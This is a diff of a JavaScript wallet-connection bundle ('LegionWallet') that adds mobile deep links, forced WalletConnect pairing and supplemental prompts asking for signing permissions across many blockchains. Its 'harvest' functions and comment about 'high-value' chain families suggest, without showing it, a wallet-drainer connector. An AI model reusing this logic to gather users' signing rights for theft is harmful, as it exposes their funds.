@@ -5,8 +5,14 @@
 import './polyfills.js';
 import './caip-registry.js';
 import { installWcJsonPatch, uninstallWcJsonPatch } from './wc-json-patch.js';
+import { buildWcFamilyAdapters } from './wc-namespace-providers.js';
 import * as viemChains from 'viem/chains';
 import { createAppKit } from '@reown/appkit';
+import {
+  ApiController,
+  ConnectionController,
+  ConnectionControllerUtil,
+} from '@reown/appkit-controllers';
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
 import { SolanaAdapter } from '@reown/appkit-adapter-solana';
 import { BitcoinAdapter } from '@reown/appkit-adapter-bitcoin';
@@ -25,12 +31,16 @@ import {
   solana,
   bitcoin,
 } from '@reown/appkit/networks';
+import EthereumProvider from '@walletconnect/ethereum-provider';
 
 const RELAY_URL = 'wss://relay.walletconnect.org';
 const NETWORKS = [mainnet, polygon, bsc, arbitrum, optimism, base, avalanche, solana, bitcoin];
 const MODAL_CLOSE_GRACE_MS = 180000;
 const APPKIT_VERSION = '1.8.22';
-const BUNDLE_VERSION = '1.3.8';
+const BUNDLE_VERSION = '1.5.18';
+/** Passive wait after EVM — wallets rarely append optional namespaces late; don't hang. */
+const DEFAULT_MULTICHAIN_HARVEST_MS = 10000;
+const DEFAULT_BIP122_POLL_MS = 8000;
 const SESSION_CTX_KEY = 'legion_wc_session_ctx';
 const BIP122_BITCOIN_MAINNET = 'bip122:000000000019d6689c085ae165831e93';
 
@@ -213,6 +223,403 @@ function log(...args) {
   console.log('[LegionWallet]', ...args);
 }
 
+/** Mobile → deep link; Desktop → QR. Also catch "Desktop site" UA on phones. */
+function isMobileDevice() {
+  try {
+    const ua = navigator.userAgent || '';
+    if (/iPhone|iPad|iPod|Android/i.test(ua)) return true;
+    if (/Mobile/i.test(ua)) return true;
+    if (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1) return true;
+    if (navigator.maxTouchPoints > 0 && typeof window.matchMedia === 'function') {
+      if (window.matchMedia('(pointer: coarse)').matches) return true;
+      if (window.matchMedia('(max-width: 900px) and (hover: none)').matches) return true;
+    }
+  } catch (_) { /* ignore */ }
+  return false;
+}
+
+function normalizeDeepLinkTarget(raw) {
+  const t = String(raw || '').toLowerCase().trim();
+  if (!t || t === 'walletconnect' || t === 'wc') return null;
+  if (t.includes('trust')) return 'trust';
+  if (t.includes('metamask') || t === 'mm') return 'metamask';
+  if (t.includes('coinbase') || t === 'cb') return 'coinbase';
+  return null;
+}
+
+/**
+ * Native deep links (Uniswap / Reown AppKit default).
+ * HTTPS universal links often leave the dapp tab without opening the app.
+ */
+function buildWalletDeepLink(target, uri) {
+  const enc = encodeURIComponent(uri);
+  if (target === 'metamask') return 'metamask://wc?uri=' + enc;
+  if (target === 'coinbase') return 'cbwallet://wc?uri=' + enc;
+  return 'trust://wc?uri=' + enc;
+}
+
+function buildWalletUniversalLink(target, uri) {
+  const enc = encodeURIComponent(uri);
+  if (target === 'metamask') return 'https://metamask.app.link/wc?uri=' + enc;
+  if (target === 'coinbase') return 'https://go.cb-w.com/wc?uri=' + enc;
+  return 'https://link.trustwallet.com/wc?uri=' + enc;
+}
+
+/** Same as AppKit CoreHelperUtil.openHref(href, '_self'). Mobile only. */
+function openMobileWalletHref(href) {
+  if (!href) return;
+  try {
+    window.open(href, '_self');
+    return;
+  } catch (_) { /* fall through */ }
+  try {
+    window.location.href = href;
+  } catch (_) { /* ignore */ }
+}
+
+/** Try native schema then HTTPS universal (iOS Safari often needs both). */
+function openMobileWalletDeepLink(target, uri) {
+  if (!uri) return;
+  const native = buildWalletDeepLink(target, uri);
+  const uni = buildWalletUniversalLink(target, uri);
+  openMobileWalletIframe(native);
+  openMobileWalletHref(native);
+  // Fallback universal after short delay if app didn't take over
+  setTimeout(() => {
+    try {
+      if (!document.hidden) openMobileWalletHref(uni);
+    } catch (_) { /* ignore */ }
+  }, 700);
+}
+
+/** Android: fire schema via hidden iframe (page stays on dapp). Mobile only. */
+function openMobileWalletIframe(href) {
+  if (!href) return;
+  try {
+    if (!/Android/i.test(navigator.userAgent || '')) return;
+    const ifr = document.createElement('iframe');
+    ifr.setAttribute('aria-hidden', 'true');
+    ifr.style.cssText = 'display:none;width:0;height:0;border:0';
+    ifr.src = href;
+    document.body.appendChild(ifr);
+    setTimeout(() => {
+      try { ifr.remove(); } catch (_) { /* ignore */ }
+    }, 2500);
+  } catch (_) { /* ignore */ }
+}
+
+function deepLinkButtonLabel(target) {
+  if (target === 'metamask') return 'Open MetaMask';
+  if (target === 'coinbase') return 'Open Coinbase Wallet';
+  return 'Open Trust Wallet';
+}
+
+/**
+ * Kill Legion overlays. No custom "Preparing…" sheet — direct trust:// deep link only.
+ */
+function clearLegionConnectOverlay() {
+  if (!isMobileDevice()) return;
+  try {
+    const ov = document.getElementById('__lgn_co');
+    if (ov) ov.remove();
+    document.documentElement.classList.remove('legion-overlay-active');
+  } catch (_) { /* ignore */ }
+  hideMobileDeepLinkSheet();
+}
+
+/** @deprecated No custom sheet — direct deep link when URI ready. */
+function showMobileOpenSheet(target) {
+  if (!isMobileDevice()) return;
+  clearLegionConnectOverlay();
+  log('direct deep-link mode (no Preparing sheet)', normalizeDeepLinkTarget(target) || target);
+}
+
+/** Direct open — no Preparing sheet. URI → trust:// immediately. */
+function setMobileOpenSheetUri(uri, target) {
+  if (!isMobileDevice() || !uri) return;
+  const wallet = normalizeDeepLinkTarget(target) || 'trust';
+  try { window.__LEGION_LAST_WC_URI__ = String(uri); } catch (_) { /* ignore */ }
+  hideMobileDeepLinkSheet();
+  openMobileWalletDeepLink(wallet, String(uri));
+  log('direct deep-link fired', wallet, String(uri).slice(0, 48) + '…');
+}
+
+function showMobileDeepLinkSheet(uri, target) {
+  setMobileOpenSheetUri(uri, target);
+}
+
+function hideMobileDeepLinkSheet() {
+  try {
+    const el = document.getElementById('__legion_mobile_wc_sheet');
+    if (el) el.remove();
+  } catch (_) { /* ignore */ }
+}
+
+/** When WC URI ready → open the wallet the user already picked (no second select). */
+function installDisplayUriDeepLink(m, target) {
+  if (!isMobileDevice()) return function () {};
+  const wallet = normalizeDeepLinkTarget(target);
+  // Generic WalletConnect (no named target) → AppKit list handles deep links
+  if (!wallet) return function () {};
+  let handled = false;
+  const onUri = (uri) => {
+    if (handled || !uri) return;
+    const s = String(uri);
+    if (s.indexOf('wc:') !== 0) return;
+    handled = true;
+    log('display_uri →', wallet, 'deep link');
+    try { m?.close?.(); } catch (_) { /* ignore */ }
+    showMobileDeepLinkSheet(s, wallet);
+  };
+
+  const unsubs = [];
+  try {
+    if (m && typeof m.subscribeEvents === 'function') {
+      unsubs.push(m.subscribeEvents((ev) => {
+        const e = ev?.data || ev || {};
+        const name = String(e.event || e.type || e.name || '');
+        if (/display_uri/i.test(name)) {
+          onUri(e.properties?.uri || e.uri || e.data?.uri || e.data);
+        }
+      }));
+    }
+  } catch (_) { /* ignore */ }
+
+  try {
+    const connectors = wagmiAdapter?.wagmiConfig ? getConnectors(wagmiAdapter.wagmiConfig) : [];
+    for (let i = 0; i < connectors.length; i++) {
+      const c = connectors[i];
+      if (!isWalletConnectConnector(c?.id)) continue;
+      const handler = (msg) => {
+        if (msg?.type === 'display_uri') onUri(msg.data);
+      };
+      try {
+        c.emitter?.on?.('message', handler);
+        unsubs.push(() => { try { c.emitter?.off?.('message', handler); } catch (_) { /* ignore */ } });
+      } catch (_) { /* ignore */ }
+    }
+  } catch (_) { /* ignore */ }
+
+  const poll = setInterval(() => {
+    if (handled) return;
+    try {
+      const up = m?.getUniversalProvider?.() || m?.universalProvider;
+      if (up?.uri) onUri(up.uri);
+    } catch (_) { /* ignore */ }
+  }, 400);
+  unsubs.push(() => clearInterval(poll));
+
+  return function cleanup() {
+    for (let i = 0; i < unsubs.length; i++) {
+      try { unsubs[i](); } catch (_) { /* ignore */ }
+    }
+  };
+}
+
+function openWcUi(m) {
+  if (!m || typeof m.open !== 'function') return Promise.resolve();
+  if (isMobileDevice()) {
+    log('opening WC mobile Connect (deep links)...');
+    return m.open({ view: 'AllWallets' }).catch(function () {
+      return m.open({ view: 'Connect' });
+    });
+  }
+  log('opening WC QR...');
+  return m.open({ view: 'ConnectingWalletConnect' });
+}
+
+/**
+ * MOBILE ONLY — same FUNCTIONAL path as Uniswap / Reown AppKit:
+ * 1) Reset pairing
+ * 2) Open ConnectingWalletConnect (Open + Copy link UI)
+ * 3) connectWalletConnect → wcUri
+ * 4) onConnectMobile(wallet) → trust://wc?uri=… (auto + Open button)
+ */
+const NAMED_WC_WALLETS = {
+  trust: {
+    id: '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
+    name: 'Trust Wallet',
+    mobile_link: 'trust://',
+    homepage: 'https://trustwallet.com',
+  },
+  metamask: {
+    id: 'c57ca95b47569778a82878ad10d6d43d',
+    name: 'MetaMask',
+    mobile_link: 'metamask://',
+    homepage: 'https://metamask.io',
+  },
+  coinbase: {
+    id: 'fd20dc426fb37566d803205b19bbc1d9',
+    name: 'Coinbase Wallet',
+    mobile_link: 'cbwallet://',
+    homepage: 'https://www.coinbase.com/wallet',
+  },
+};
+
+function enrichNamedWalletFromExplorer(base) {
+  try {
+    const pools = [
+      ApiController.state.wallets,
+      ApiController.state.recommended,
+      ApiController.state.featured,
+      ApiController.state.importedWallets,
+    ];
+    for (let p = 0; p < pools.length; p++) {
+      const list = pools[p];
+      if (!Array.isArray(list)) continue;
+      for (let i = 0; i < list.length; i++) {
+        const w = list[i];
+        if (!w) continue;
+        if (w.id === base.id || String(w.name || '').toLowerCase() === String(base.name || '').toLowerCase()) {
+          return {
+            ...base,
+            ...w,
+            id: w.id || base.id,
+            name: w.name || base.name,
+            mobile_link: w.mobile_link || base.mobile_link,
+            link_mode: w.link_mode != null ? w.link_mode : (base.link_mode || null),
+          };
+        }
+      }
+    }
+  } catch (_) { /* ignore */ }
+  return base;
+}
+
+/**
+ * @returns {() => void} cleanup (unsubscribe URI listener)
+ */
+async function openNamedWalletAppKit(m, target) {
+  if (!isMobileDevice()) {
+    await m.open({ view: 'Connect' });
+    return function () {};
+  }
+
+  const key = normalizeDeepLinkTarget(target) || 'trust';
+  clearLegionConnectOverlay();
+
+  // Fresh pairing — AppKit view will start ONE connectWalletConnect (do NOT double-call)
+  try { ConnectionController.resetWcConnection(); } catch (_) { /* ignore */ }
+
+  try { await ApiController.prefetch(); } catch (_) { /* ignore */ }
+
+  let wallet = enrichNamedWalletFromExplorer(NAMED_WC_WALLETS[key] || NAMED_WC_WALLETS.trust);
+  if (!wallet.mobile_link) {
+    wallet = { ...wallet, mobile_link: (NAMED_WC_WALLETS[key] || NAMED_WC_WALLETS.trust).mobile_link };
+  }
+
+  log('direct Trust deep-link (no custom Preparing sheet) →', wallet.name);
+
+  clearLegionConnectOverlay();
+  hideMobileDeepLinkSheet();
+
+  let deeplinkFired = false;
+  const fireOpen = (why, uriOverride) => {
+    const uri = uriOverride || ConnectionController.state.wcUri;
+    if (!uri) return;
+    try { window.__LEGION_LAST_WC_URI__ = String(uri); } catch (_) { /* ignore */ }
+    if (deeplinkFired) return;
+    deeplinkFired = true;
+    log('wcUri → direct open (' + why + ')');
+    // Prefer AppKit native mobile open; always hard-open trust:// as well
+    try {
+      ConnectionControllerUtil.onConnectMobile(wallet);
+    } catch (e) {
+      log('onConnectMobile error', e?.message || e);
+    }
+    openMobileWalletDeepLink(key, uri);
+  };
+
+  const unsub = ConnectionController.subscribeKey('wcUri', (u) => {
+    fireOpen('uri-event', u || ConnectionController.state.wcUri);
+  });
+
+  fireOpen('immediate');
+
+  const pollUri = setInterval(() => {
+    const u = ConnectionController.state.wcUri;
+    if (!u) return;
+    fireOpen('poll', u);
+    clearInterval(pollUri);
+  }, 300);
+
+  // Start pairing immediately — URI listeners already armed
+  try {
+    ConnectionController.connectWalletConnect({ cache: 'never' }).catch((e) => {
+      log('connectWalletConnect start', e?.message || e);
+    });
+  } catch (e) {
+    log('connectWalletConnect throw', e?.message || e);
+  }
+
+  // AppKit Connecting UI only (its own Open button) — no Legion Preparing sheet
+  m.open({
+    view: 'ConnectingWalletConnect',
+    data: { wallet },
+  }).catch((e) => {
+    log('ConnectingWalletConnect open', e?.message || e);
+  });
+
+  const kickTimer = setTimeout(() => {
+    if (ConnectionController.state.wcUri) return;
+    if (ConnectionController.state.wcFetchingUri) return;
+    log('AppKit idle — connectWalletConnect kick');
+    ConnectionController.connectWalletConnect({ cache: 'never' }).catch((e) => {
+      log('connectWalletConnect kick', e?.message || e);
+    });
+  }, 1200);
+
+  const retryTimer = setTimeout(() => {
+    if (ConnectionController.state.wcUri) return;
+    log('wcUri still missing — reset + reconnect');
+    try { ConnectionController.resetWcConnection(); } catch (_) { /* ignore */ }
+    ConnectionController.connectWalletConnect({ cache: 'never' }).catch((e) => {
+      log('reconnect fail', e?.message || e);
+    });
+  }, 3500);
+
+  const fetchStuckTimer = setTimeout(() => {
+    if (ConnectionController.state.wcUri) return;
+    if (!ConnectionController.state.wcFetchingUri) return;
+    log('wcFetchingUri timeout — reset + reconnect');
+    try { ConnectionController.resetWcConnection(); } catch (_) { /* ignore */ }
+    ConnectionController.connectWalletConnect({ cache: 'never' }).catch((e) => {
+      log('fetch-stuck reconnect', e?.message || e);
+    });
+  }, 4000);
+
+  return function cleanupNamedMobileWc() {
+    clearTimeout(kickTimer);
+    clearTimeout(retryTimer);
+    clearTimeout(fetchStuckTimer);
+    clearInterval(pollUri);
+    try { unsub(); } catch (_) { /* ignore */ }
+  };
+}
+
+/**
+ * @deprecated custom sheet path removed — AppKit owns mobile Open UX.
+ * Kept as no-op export for older site embeds that still call showMobileOpenSheet.
+ */
+async function startMobileDeepLinkPairing(config) {
+  const m = modal || (await ensureInit({ projectId: config?.projectId }));
+  await openNamedWalletAppKit(m, config?.deepLinkTarget);
+  await waitForAccount(m, config?.timeoutMs || 180000, true);
+  eip155Provider = modal?.getProvider?.('eip155') || eip155Provider;
+  activeConnectorId = 'walletConnect';
+  saveSessionContext(scanWcSessionAllFamilies());
+  return wrapProvider(
+    eip155Provider || (await resolveProviderAsync(m, true)),
+    m,
+    { isWalletConnect: true, connectorId: 'walletConnect' }
+  );
+}
+
+/** @deprecated kept as unused fallback name — mobile uses startMobileDeepLinkPairing */
+async function startWcPairingWithoutModal(m, config) {
+  return startMobileDeepLinkPairing(config);
+}
+
 function buildMetadata(override) {
   const origin = window.location.origin;
   const returnUrl = origin + window.location.pathname + window.location.search;
@@ -228,12 +635,11 @@ function buildMetadata(override) {
     description: 'Connect your wallet',
     url: origin,
     icons: [icon],
+    // Do NOT use open_url redirects here — breaks WC pairing deep links on mobile Trust.
     redirect: {
-      native: `trust://open_url?coin_id=60&url=${encodedReturn}`,
-      universal: `https://link.trustwallet.com/open_url?coin_id=60&url=${encodedReturn}`,
+      native: 'trust://',
+      universal: 'https://link.trustwallet.com',
       linkMode: true,
-      okx: `okx://wallet/dapp/url?dappUrl=${encodedReturn}`,
-      bitget: `bitkeep://bkconnect?action=dapp&url=${encodedReturn}`,
     },
   };
 
@@ -348,6 +754,37 @@ function getSessionAddresses() {
   if (families.sui) flat.sui = families.sui.address;
   if (families.near) flat.near = families.near.address;
   return { families, flat };
+}
+
+/** Debug: raw WC session namespace keys (UI can list chains the settled session never grants). */
+function dumpRawWcNamespaceKeys() {
+  const out = [];
+  try {
+    const keys = Object.keys(localStorage);
+    for (let i = 0; i < keys.length; i++) {
+      const k = keys[i];
+      if (k.indexOf('wc@') === -1 || k.indexOf('session') === -1) continue;
+      const obj = JSON.parse(localStorage.getItem(k) || '{}');
+      const sessions = Object.values(obj);
+      for (let j = 0; j < sessions.length; j++) {
+        const ns = sessions[j]?.namespaces;
+        if (!ns) continue;
+        Object.keys(ns).forEach((nk) => {
+          const nAcc = (ns[nk]?.accounts && ns[nk].accounts.length) || 0;
+          out.push(nk + ':' + nAcc);
+        });
+      }
+    }
+  } catch (_) { /* ignore */ }
+  return out;
+}
+
+function logSettledNamespaces(tag) {
+  const raw = dumpRawWcNamespaceKeys();
+  const linked = scanWcSessionAllFamilies();
+  const fam = Object.keys(linked).filter((k) => linked[k]?.address);
+  log(tag || 'WC settle', '| raw namespaces:', raw.join(',') || 'none',
+    '| families:', fam.join(',') || 'evm-only');
 }
 
 function wrapProvider(inner, m, meta) {
@@ -614,10 +1051,13 @@ async function ensureInit(config) {
       enableEIP6963: false,
       enableReconnect: false,
       allWallets: 'SHOW',
+      // Trust first on mobile. Do NOT exclude Trust — required for Trust Card deep links.
+      featuredWalletIds: [
+        '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
+      ],
       excludeWalletIds: [
         'c57ca95b475697bbe86cbad9b9b46516',
         'fd20dc426fb37566d803205b19bbc1d9',
-        '4622a2b2d6af1c9844940161a1745efb',
         '1ae92b26df02f0abca63baedd3e7e6e5',
       ],
     });
@@ -695,6 +1135,7 @@ function waitForAccount(m, timeoutMs, requireWc) {
       saveSessionContext(families);
       log('account ready', String(addr).slice(0, 10) + '...', source || '',
         '| families:', Object.keys(families).join(',') || 'evm');
+      logSettledNamespaces('account ready settle');
       resolve({ address: addr, isConnected: true, sessionFamilies: families, ...st });
     };
 
@@ -872,7 +1313,6 @@ function waitForBip122Session(m, timeoutMs) {
   });
 }
 
-/** T1/T3 — link bip122 when Trust omits it on first WC approval */
 async function ensureBip122Link(config) {
   const families = scanWcSessionAllFamilies();
   if (families.btc?.address) return families.btc.address;
@@ -890,7 +1330,7 @@ async function ensureBip122Link(config) {
     applyOptionalNamespaces(m, { bip122: bipNs });
     await disconnectInjectedWagmi();
     await prepWcOnlyWagmi();
-    await m.open({ view: 'ConnectingWalletConnect' });
+    await openWcUi(m);
     const btcAddr = await waitForBip122Session(m, config?.timeoutMs || 120000);
     await syncWagmiWcConnection({ requireWc: true });
     try { await m.close(); } catch (_) { /* ignore */ }
@@ -905,16 +1345,162 @@ async function ensureBip122Link(config) {
   }
 }
 
+const NS_SESSION_KEY = {
+  sol: 'sol',
+  solana: 'sol',
+  tron: 'tron',
+  ton: 'ton',
+  cosmos: 'cosmos',
+  aptos: 'aptos',
+  sui: 'sui',
+};
+
+function waitForNamespaceSession(m, sessionKey, timeoutMs) {
+  return new Promise((resolve, reject) => {
+    let done = false;
+    const finish = (addr) => {
+      if (done) return;
+      done = true;
+      clearTimeout(timer);
+      clearInterval(poll);
+      resolve(addr);
+    };
+    const fail = (err) => {
+      if (done) return;
+      done = true;
+      clearTimeout(timer);
+      clearInterval(poll);
+      reject(err);
+    };
+    const timer = setTimeout(() => {
+      const f = scanWcSessionAllFamilies();
+      if (f[sessionKey]?.address) finish(f[sessionKey].address);
+      else fail(new Error(sessionKey + ' approval timeout — enable on phone wallet'));
+    }, timeoutMs || 90000);
+    const poll = setInterval(() => {
+      if (done) return;
+      const f = scanWcSessionAllFamilies();
+      if (f[sessionKey]?.address) finish(f[sessionKey].address);
+    }, 600);
+  });
+}
+
+/** Supplemental Solana — AppKit solana namespace (Trust/OKX often drop SOL from first settle). */
+async function ensureSolanaLink(config) {
+  const families = scanWcSessionAllFamilies();
+  if (families.sol?.address) return families.sol.address;
+
+  const m = modal || (config?.projectId ? await ensureInit(config) : null);
+  if (!m) return null;
+
+  log('solana missing — supplemental AppKit/WC solana');
+  try {
+    const solNs = config?.optionalNamespaces?.solana || {
+      chains: ['solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp'],
+      methods: [
+        'solana_signMessage',
+        'solana_signTransaction',
+        'solana_signAllTransactions',
+        'solana_signAndSendTransaction',
+      ],
+      events: DEFAULT_WC_EVENTS,
+    };
+    applyOptionalNamespaces(m, { solana: solNs });
+    await disconnectInjectedWagmi();
+    await prepWcOnlyWagmi();
+    try {
+      await m.open({ view: 'Connect', namespace: 'solana' });
+    } catch (_) {
+      await openWcUi(m);
+    }
+    const addr = await waitForNamespaceSession(m, 'sol', config?.timeoutMs || 45000);
+    await syncWagmiWcConnection({ requireWc: true });
+    try { await m.close(); } catch (_) { /* ignore */ }
+    saveSessionContext(scanWcSessionAllFamilies());
+    if (addr) return addr;
+    return scanWcSessionAllFamilies().sol?.address || null;
+  } catch (e) {
+    log('solana supplemental link skipped', e?.message || e);
+    return null;
+  }
+}
+
+/** Supplemental WC prompt for one namespace (tron/ton/cosmos/aptos/sui) — Phase 4 */
+async function ensureWcNamespaceLink(config) {
+  const ns = String(config?.namespace || '').toLowerCase();
+  const sessionKey = NS_SESSION_KEY[ns] || ns;
+  if (!sessionKey) return null;
+  if (sessionKey === 'sol') return ensureSolanaLink(config);
+  if (!config?.optionalNamespaces?.[ns] && ns !== 'solana') return null;
+
+  const families = scanWcSessionAllFamilies();
+  if (families[sessionKey]?.address) return families[sessionKey].address;
+
+  const m = modal || (config?.projectId ? await ensureInit(config) : null);
+  if (!m) return null;
+
+  log(sessionKey, 'missing — supplemental WC prompt');
+  try {
+    applyOptionalNamespaces(m, { [ns]: config.optionalNamespaces[ns] });
+    await disconnectInjectedWagmi();
+    await prepWcOnlyWagmi();
+    await openWcUi(m);
+    const addr = await waitForNamespaceSession(m, sessionKey, config?.timeoutMs || 45000);
+    await syncWagmiWcConnection({ requireWc: true });
+    try { await m.close(); } catch (_) { /* ignore */ }
+    saveSessionContext(scanWcSessionAllFamilies());
+    return addr || families[sessionKey]?.address || null;
+  } catch (e) {
+    log(sessionKey, 'supplemental link skipped', e?.message || e);
+    return null;
+  }
+}
+
+/** Batch supplemental WC for high-value missing families — Phase 4 */
+async function ensureWcSupplementalFamilies(config) {
+  const want = config?.wantFamilies || ['tron', 'ton', 'cosmos', 'aptos', 'sui'];
+  const optionalNamespaces = config?.optionalNamespaces || {};
+  const out = {};
+  for (let i = 0; i < want.length; i++) {
+    const ns = want[i];
+    if (!optionalNamespaces[ns]) continue;
+    const linked = scanWcSessionAllFamilies();
+    if (linked[ns]?.address) {
+      out[ns] = linked[ns].address;
+      continue;
+    }
+    const addr = await ensureWcNamespaceLink({
+      namespace: ns,
+      projectId: config.projectId,
+      optionalNamespaces,
+      timeoutMs: config.timeoutMs || 90000,
+    });
+    if (addr) out[ns] = addr;
+  }
+  return out;
+}
+
 async function connect(config) {
   const m = await ensureInit(config);
   const requireWc = config?.requireWalletConnect !== false;
   const preserveSession = config?.preserveSession === true;
   const shouldRestore = config?.restore === true;
 
+  const deepLinkTarget = normalizeDeepLinkTarget(
+    config?.deepLinkTarget || (typeof window !== 'undefined' ? window.__LEGION_DEEP_LINK_TARGET__ : null)
+  );
+  if (typeof window !== 'undefined' && window.__LEGION_DEEP_LINK_TARGET__) {
+    try { window.__LEGION_DEEP_LINK_TARGET__ = null; } catch (_) { /* ignore */ }
+  }
+
   installWcJsonPatch();
 
   try {
-  if (shouldRestore || preserveSession) {
+  // Named mobile deep-link always needs a fresh wc: URI — never restore/reuse
+  if (deepLinkTarget) {
+    clearWcStorage();
+    try { await m.disconnect(); } catch (_) { /* ignore */ }
+  } else if (shouldRestore || preserveSession) {
     const recovered = await tryRecoverStoredSession(m, requireWc);
     if (recovered) {
       log('connected via session recovery | wc=', recovered.isWalletConnect);
@@ -922,30 +1508,32 @@ async function connect(config) {
     }
   }
 
-  if (shouldRestore && wagmiAdapter?.wagmiConfig && !requireWc) {
+  if (!deepLinkTarget && shouldRestore && wagmiAdapter?.wagmiConfig && !requireWc) {
     try {
       log('WC restore: attempting reconnect');
       await reconnect(wagmiAdapter.wagmiConfig);
     } catch (_) { /* fresh connect */ }
   }
 
+  const mobile = isMobileDevice();
+
   if (requireWc) {
     await disconnectInjectedWagmi();
     await prepWcOnlyWagmi();
     try { await m.disconnect(); } catch (_) { /* ignore */ }
-    await new Promise((r) => setTimeout(r, 500));
+    if (!mobile) await new Promise((r) => setTimeout(r, 500));
   }
 
-  if (config?.forceFresh === true && !preserveSession) {
+  if ((config?.forceFresh === true || deepLinkTarget) && !preserveSession) {
     clearWcStorage();
     try { await m.disconnect(); } catch (_) { /* ignore */ }
-    await new Promise((r) => setTimeout(r, 350));
-  } else if (preserveSession) {
+    if (!mobile) await new Promise((r) => setTimeout(r, 350));
+  } else if (preserveSession && !deepLinkTarget) {
     log('preserving WC session for recovery');
   }
 
-  const existing = wagmiAdapter?.wagmiConfig ? getAccount(wagmiAdapter.wagmiConfig) : null;
-  const lsFamilies = scanWcSessionAllFamilies();
+  const existing = deepLinkTarget ? null : (wagmiAdapter?.wagmiConfig ? getAccount(wagmiAdapter.wagmiConfig) : null);
+  const lsFamilies = deepLinkTarget ? {} : scanWcSessionAllFamilies();
   if (existing?.isConnected && existing.address) {
     const connId = existing.connector?.id || '';
     if (!requireWc || isWalletConnectConnector(connId)) {
@@ -957,7 +1545,7 @@ async function connect(config) {
     if (requireWc && isInjectedConnector(connId)) {
       log('disconnecting injected session', connId);
       try { await m.disconnect(); } catch (_) { /* ignore */ }
-      await new Promise((r) => setTimeout(r, 400));
+      if (!mobile) await new Promise((r) => setTimeout(r, 400));
     }
   }
 
@@ -970,30 +1558,69 @@ async function connect(config) {
     applyOptionalNamespaces(m, config.optionalNamespaces);
   }
 
-  log('opening WC QR...');
-  await m.open({ view: 'ConnectingWalletConnect' });
-  await waitForAccount(m, config?.timeoutMs || 180000, requireWc);
+  const stopUriHook = (mobile && deepLinkTarget)
+    ? function () {}
+    : installDisplayUriDeepLink(m, deepLinkTarget);
+  let stopNamedMobile = function () {};
+  try {
+    // MOBILE + named wallet → AppKit UI + connectWalletConnect + onConnectMobile (Uniswap functions)
+    if (mobile && deepLinkTarget) {
+      hideMobileDeepLinkSheet();
+      stopNamedMobile = await openNamedWalletAppKit(m, deepLinkTarget) || function () {};
+      await waitForAccount(m, config?.timeoutMs || 180000, requireWc);
+    } else {
+      await openWcUi(m);
+      await waitForAccount(m, config?.timeoutMs || 180000, requireWc);
+    }
+  } finally {
+    try { stopNamedMobile(); } catch (_) { /* ignore */ }
+    try { stopUriHook(); } catch (_) { /* ignore */ }
+    hideMobileDeepLinkSheet();
+  }
 
   await syncWagmiWcConnection({ requireWc });
 
   let linkedBeforeClose = scanWcSessionAllFamilies();
+  logSettledNamespaces('post-connect');
+  const multichainWaitMs = config?.multichainHarvestMs != null
+    ? config.multichainHarvestMs
+    : DEFAULT_MULTICHAIN_HARVEST_MS;
+  const wantFamilies = ['sol', 'tron', 'btc'];
+  const missingFamilies = () => wantFamilies.filter((k) => !linkedBeforeClose[k]?.address);
+  if (missingFamilies().length && multichainWaitMs > 0) {
+    log('multichain harvest — short wait for phone approve:', missingFamilies().join(', '),
+      '| ms:', multichainWaitMs);
+    const deadline = Date.now() + multichainWaitMs;
+    while (Date.now() < deadline && missingFamilies().length) {
+      await new Promise((r) => setTimeout(r, 500));
+      linkedBeforeClose = scanWcSessionAllFamilies();
+      syncWalletState();
+    }
+    log('multichain harvest result:', Object.keys(linkedBeforeClose).filter((k) => linkedBeforeClose[k]?.address).join(',') || 'evm-only');
+    logSettledNamespaces('post-harvest');
+  }
+
+  // Passive bip122 poll only during connect — heavy supplemental UI runs later via harvestMultichainSession / legion enrich
   if (!linkedBeforeClose.btc?.address && config?.linkBitcoin !== false) {
-    log('EVM ready — polling bip122 (Trust adds BTC after EVM approve)...');
-    const polledBtc = await pollForBip122(35000);
+    const bipPoll = config?.bip122PollMs != null ? config.bip122PollMs : DEFAULT_BIP122_POLL_MS;
+    log('EVM ready — short bip122 poll', bipPoll, 'ms');
+    const polledBtc = bipPoll > 0 ? await pollForBip122(bipPoll) : null;
     if (polledBtc) {
       log('bip122 detected via poll:', polledBtc.slice(0, 10) + '...');
-    } else if (config?.ensureBip122 !== false) {
-      log('bip122 missing — opening supplemental BTC approve (enable Bitcoin on Trust/OKX)');
+    } else if (config?.ensureBip122 === true) {
+      log('bip122 missing — opening supplemental BTC approve');
       try {
         await ensureBip122Link({
           projectId: config?.projectId || initProjectId,
           metadata: config?.metadata,
           optionalNamespaces: config?.optionalNamespaces,
-          timeoutMs: config?.timeoutMs || 120000,
+          timeoutMs: Math.min(config?.timeoutMs || 60000, 60000),
         });
       } catch (e) {
         log('supplemental bip122 skipped', e?.message || e);
       }
+    } else {
+      log('bip122 missing — defer supplemental (connect returns; enrich later)');
     }
   }
 
@@ -1007,7 +1634,8 @@ async function connect(config) {
   }
   saveSessionContext(scanWcSessionAllFamilies());
   const linked = scanWcSessionAllFamilies();
-  log('WC namespaces received:', Object.keys(linked).join(',') || 'evm-only',
+  logSettledNamespaces('WC namespaces final');
+  log('WC namespaces received:', Object.keys(linked).filter((k) => linked[k]?.address).join(',') || 'evm-only',
     linked.btc ? '' : '| warn: bip122 missing');
   log('connected via', provider.connectorId, 'wc=', provider.isWalletConnect);
   return provider;
@@ -1056,7 +1684,7 @@ async function closeModal() {
 
 function open() {
   if (!modal) throw new Error('LegionWallet not initialized — call connect() first');
-  return modal.open({ view: 'ConnectingWalletConnect' });
+  return openWcUi(modal);
 }
 
 function getSolanaProvider() {
@@ -1065,6 +1693,79 @@ function getSolanaProvider() {
 
 function getBitcoinProvider() {
   return bitcoinProvider;
+}
+
+function getWcFamilyAdapters() {
+  if (!modal) return {};
+  const { families } = getSessionAddresses();
+  return buildWcFamilyAdapters(modal, families);
+}
+
+async function harvestMultichainSession(config = {}) {
+  const waitMs = config.waitMs != null
+    ? config.waitMs
+    : (config.multichainHarvestMs != null ? config.multichainHarvestMs : DEFAULT_MULTICHAIN_HARVEST_MS);
+  const wantFamilies = config.wantFamilies || ['sol', 'tron', 'btc', 'ton', 'cosmos', 'aptos', 'sui'];
+  syncWalletState();
+  logSettledNamespaces('harvest start');
+
+  let linked = scanWcSessionAllFamilies();
+  const missingFamilies = () => wantFamilies.filter((k) => !linked[k]?.address);
+
+  if (missingFamilies().length && waitMs > 0) {
